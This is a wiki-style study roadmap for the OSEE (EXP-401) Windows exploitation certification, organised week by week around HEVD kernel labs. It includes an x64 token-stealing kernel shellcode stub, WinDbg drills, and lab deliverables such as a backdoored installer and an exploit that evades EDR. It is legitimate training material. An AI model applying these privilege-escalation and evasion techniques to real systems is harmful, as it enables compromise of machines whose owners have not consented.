---
title: OSEE roadmap (EXP-401)
slug: osee-roadmap
aliases: [osee-prep-roadmap, exp-401-roadmap]
---

{% raw %}

> **TL;DR:** A 16-20 week roadmap from "I passed OSEP and OSWE" to "ready to sit OSEE". OSEE (Advanced Windows Exploitation, EXP-401) tests Windows kernel exploitation and modern-mitigation-bypass against full chains. The exam is two days of intensive exploit development. Pair with [[oscp-osep-oswe-track-comparison]] and [[hevd-stack-overflow-walkthrough]].

## Prerequisites

- OSCP-level scripting + methodology reflex.
- OSEP-level Windows internals and tooling reflex.
- Read x64 assembly without a reference open.
- Read C and Windows API code fluently.
- WinDbg comfort — set breakpoints, walk structures, dump memory.
- Already passed at least one BOF-style cert (OSED preferred but not required).

OSEE is a step function above OSEP. Going in without prerequisites means using lab hours on basics.

## What OSEE tests (current syllabus snapshot — verify with OffSec)

- Custom Windows shellcode writing (PIC, badchars).
- Reverse engineering for exploit development.
- DEP / ASLR / CFG / CET bypass.
- HEVD-style kernel driver exploitation (stack, pool, UAF, type confusion).
- VBS / HVCI bypass when on.
- Application sandbox escape concepts.
- Token-stealing primitives, swapgs;iretq returns.
- Bug-class chains end-to-end.

## Lab setup (do before week 1)

- Windows 10 / 11 dev VMs with HEVD installed.
- Windows host with WinDbg + symbols.
- Cross-debug: target VM with kernel debugging via VirtualKD or COM port.
- IDA / Ghidra for static analysis.
- VS or g++ for exploit code.
- Snapshot tooling.

## The 16-20 weeks

### Week 1 — orientation
- Read: [[oscp-osep-oswe-track-comparison]], [[kernel-debugging-with-windbg]], [[windows-kernel-architecture]], [[pe-format]].
- Get HEVD installed and kernel-debugged.
- Deliverable: stable lab setup with WinDbg attached.

### Week 2 — shellcode by hand
- Read: [[custom-windows-shellcode-writing]], [[c-and-asm-primer]].
- Labs: write calc-popping shellcode by hand (PEB walk, kernel32 base, MessageBoxA).
- Deliverable: 200-byte shellcode under 5 specific bad-char sets.

### Week 3 — PE structures
- Read: [[pe-format]], [[pe-backdooring-and-code-caves]].
- Labs: inject shellcode into a benign EXE three ways (last section extend, code cave, new section).
- Deliverable: backdoored installer that pops calc on run, original install still works.

### Week 4 — userland exploit dev refresher
- Read: [[stack-buffer-overflow]], [[stack-bof-walkthrough-end-to-end]], [[bad-character-handling]], [[seh-overwrite]], [[egghunters]].
- Labs: re-do vulnserver TRUN, GMON, KSTET with custom shellcode (not msfvenom).
- Deliverable: each vulnserver command exploited with hand-rolled shellcode.

### Week 5 — DEP and ROP
- Read: [[dep-bypass]], [[rop-chains]], [[mona-py]].
- Labs: SLMail / Brainpan with DEP on; ROP chain to VirtualProtect → shellcode.
- Deliverable: working ROP chain.

### Week 6 — ASLR + CFG + CET bypass
- Read: [[aslr-bypass]], [[control-flow-guard]], [[cet-shadow-stack]], [[xfg]].
- Labs: leak primitive + ROP under modern mitigations on a userland target.
- Deliverable: exploit reliable under DEP+ASLR+CFG.

### Week 7 — Windows kernel architecture
- Read: [[windows-kernel-architecture]], [[kernel-objects-and-irps]], [[smep-smap-overview]], [[kpti-meltdown-implications]].
- Labs: kernel debugger walkthroughs — walk EPROCESS list, find SYSTEM, examine tokens.
- Deliverable: WinDbg muscle memory.

### Week 8 — HEVD stack overflow
- Read: [[hevd-stack-overflow-walkthrough]], [[kernel-stack-overflow]], [[token-stealing-payloads]].
- Labs: HEVD stack BOF end-to-end on Win10 with SMEP off, then SMEP on with ROP.
- Deliverable: HEVD StackOverflow exploit yielding SYSTEM.

### Week 9 — HEVD pool overflow
- Read: [[hevd-pool-overflow-walkthrough]], [[windows-pool-grooming-techniques]], [[heap-exploitation-windows]].
- Labs: HEVD pool overflow with pipe-attribute groom.
- Deliverable: HEVD PoolOverflow exploit.

### Week 10 — HEVD use-after-free
- Read: [[hevd-uaf-walkthrough]], [[use-after-free-kernel]].
- Labs: HEVD UAF with controlled reclaim.
- Deliverable: HEVD UAF exploit.

### Week 11 — HEVD type confusion + null deref
- Read: [[hevd-type-confusion-walkthrough]], [[type-confusion-kernel]].
- Labs: HEVD TypeConfusion + NullPointerDereference.
- Deliverable: both exploits.

### Week 12 — kernel info leaks
- Read: [[kaslr-bypass]], [[uninitialised-memory-disclosures]], [[double-fetch]].
- Labs: leak SYSTEM EPROCESS via HEVD or similar.
- Deliverable: KASLR-leak primitive.

### Week 13 — arbitrary read/write primitives
- Read: [[arbitrary-read-write-primitives]], [[exploit-primitives-for-mitigated-targets]].
- Labs: convert bug → AR/AW; data-only token swap.
- Deliverable: data-only LPE primitive.

### Week 14 — VBS / HVCI bypass
- Read: [[vbs-hvci-bypass-walkthrough]], [[hvci-vbs]].
- Labs: redo earlier HEVD exploit with HVCI on; rewrite as data-only attack.
- Deliverable: HVCI-on HEVD exploit.

### Week 15 — sandbox escape + browser primer
- Read: [[windows-sandbox-and-appcontainer-escape]], [[browser-exploitation-primer]].
- Labs: study a published browser exploit chain end-to-end.
- Deliverable: written analysis of the chain.

### Week 16 — EDR bypass during exploit
- Read: [[edr-bypass-at-exploitation-time]], [[edr-hooks-and-unhooking]], [[syscall-direct-and-indirect]].
- Labs: enable Defender + a community EDR; re-run earlier exploit; refactor to avoid detection.
- Deliverable: exploit that runs cleanly with modern EDR enabled.

### Week 17 — fuzzing for original bugs
- Read: [[fuzzing-windows-drivers]], [[symbolic-execution-for-windows-bugs]], [[crash-triage]].
- Labs: fuzz HEVD itself with IoctlBF / sycall fuzzer; find a bug not in the source comments.
- Deliverable: own bug + triage report.

### Week 18 — patched binary diffing
- Read: [[patched-binary-diffing-for-vulnid]], [[decompiler-driven-source-review]].
- Labs: diff a recent Windows KB; find a vulnerable function; write conceptual exploit.
- Deliverable: n-day exploit on a controlled lab target.

### Week 19 — chains
- Read: [[hyperv-attack-surface]] (briefly), [[cfg-cet-kernel]].
- Labs: combine a userland exploit (DEP + ASLR + CFG) with a kernel HEVD bug → end-to-end SYSTEM from medium-IL user.
- Deliverable: chain doc + exploit.

### Week 20 — mock and book
- Lab: 48-hour mock against a custom HEVD-style scenario.
- Read: [[report-writing-for-pentesters]].
- Deliverable: OSEE-format report; book exam if mock passed.

## WinDbg fluency drills — internalise these before week 8

Without debugger muscle memory, every kernel week takes 3x as long. Drill these against an attached HEVD VM until they are reflex.

```text
# Process / thread navigation
!process 0 0                              ; list every EPROCESS
!process 0 0 lsass.exe                    ; resolve by name
.process /i /p <EPROCESS>; g              ; context switch into that process VA
!thread <ETHREAD>                         ; walk a thread's TEB + stack

# Token + privilege walk
dt nt!_EPROCESS <addr> Token              ; pull token pointer (mask low 4 bits)
!token <addr>                             ; dump SID, integrity, privileges
dq <addr+offset_for_privs> L4             ; raw privilege bitmap

# Pool grooming view
!pool <addr>                              ; dump pool chunk header + nearby allocations
!poolfind Ipgr                            ; find all chunks with pool tag 'Ipgr' (HEVD)
!verifier 3 <driver.sys>                  ; Driver Verifier flags for the target

# Stack + IRP
kb                                        ; stack with first 3 args
!irp <addr>                               ; dump the IRP that triggered your handler
!analyze -v                               ; bugcheck post-mortem

# Breakpoints
bp HEVD!TriggerStackOverflow              ; symbol break
ba w8 <addr>                              ; access-bp, 8 bytes write on addr
bm HEVD!*Trigger*                         ; pattern-match all matching symbols
```

Drill until each one is sub-second. If a drill takes more than a few seconds because you are reading the help page, stop and re-run until it does not.

## Token-stealing payload — reference implementation

The classic kernel-mode shellcode pattern that every HEVD walkthrough ends with. Memorise the structure (offsets change per Windows build — extract dynamically):

```nasm
; x64 token-stealing stub — pseudocode (verify offsets per build)
mov rax, gs:[0x188]            ; KPCR -> current_thread
mov rax, [rax + 0xB8]          ; ETHREAD -> KPROCESS (current)
mov rcx, rax                   ; save current EPROCESS
.find_system:
  mov rax, [rax + 0x448]       ; ActiveProcessLinks.Flink
  sub rax, 0x448
  mov rdx, [rax + 0x440]       ; UniqueProcessId
  cmp rdx, 4                   ; SYSTEM PID
  jne .find_system
mov rdx, [rax + 0x4B8]         ; SYSTEM token
and dl, 0xF0                   ; clear low ref bits
mov [rcx + 0x4B8], rdx         ; swap into current EPROCESS
ret
```

Practice extracting these offsets from `dt nt!_EPROCESS` so you can rebuild the stub on a build you have not seen.

## Required tooling

- WinDbg + Time Travel Debugging.
- IDA Pro (or Ghidra) for static analysis.
- Visual Studio or g++ for exploit code.
- Python with pwntools-style helpers.
- HEVD source + compiled .sys.
- Driver Verifier enabled for testing.
- Snapshot pipeline for the target VM.

## Practice corpus

- HEVD — all bug classes.
- HEVD-Bootcamp (community).
- Connor McGarr's blog walkthroughs.
- Pwn2Own writeups for browser chains.
- DEF CON / BlackHat archive talks on Windows kernel.

## Community resources

- Connor McGarr's blog — gold standard.
- FuzzySecurity tutorials.
- 0vercl0k research.
- Project Zero archive.
- Sektor7 RTO courses — closest peer to OSEE in scope.

## Failure modes to avoid

- Skipping WinDbg fundamentals — every exploit relies on debugger fluency.
- Memorising HEVD offsets — they change per Windows build; learn to extract dynamically.
- Avoiding ASM — you can't read shellcode without it.
- Cramming — OSEE skills are time-built; you can't bootcamp the muscle memory.

## After OSEE

- Pwn2Own browser categories (months-to-years projects).
- Vendor research roles (Microsoft, Google Project Zero).
- Custom-exploit pricing tiers for nation-state / contracted research.

## References
- [OffSec EXP-401 syllabus](https://www.offsec.com/courses/exp-401/)
- [Connor McGarr — Windows kernel exploitation series](https://connormcgarr.github.io/)
- [FuzzySecurity tutorials](https://www.fuzzysecurity.com/)
- [Project Zero — research archive](https://googleprojectzero.blogspot.com/)
- [Sektor7 — RED Team Operator courses](https://institute.sektor7.net/)
- [Pavel Yosifovich — Windows Kernel Programming](https://leanpub.com/windowskernelprogrammingsecondedition)
- See also: [[oscp-roadmap]], [[osep-roadmap]], [[oswe-roadmap]], [[oscp-osep-oswe-track-comparison]], [[hevd-stack-overflow-walkthrough]], [[hevd-pool-overflow-walkthrough]], [[hevd-uaf-walkthrough]], [[hevd-type-confusion-walkthrough]]

{% endraw %}
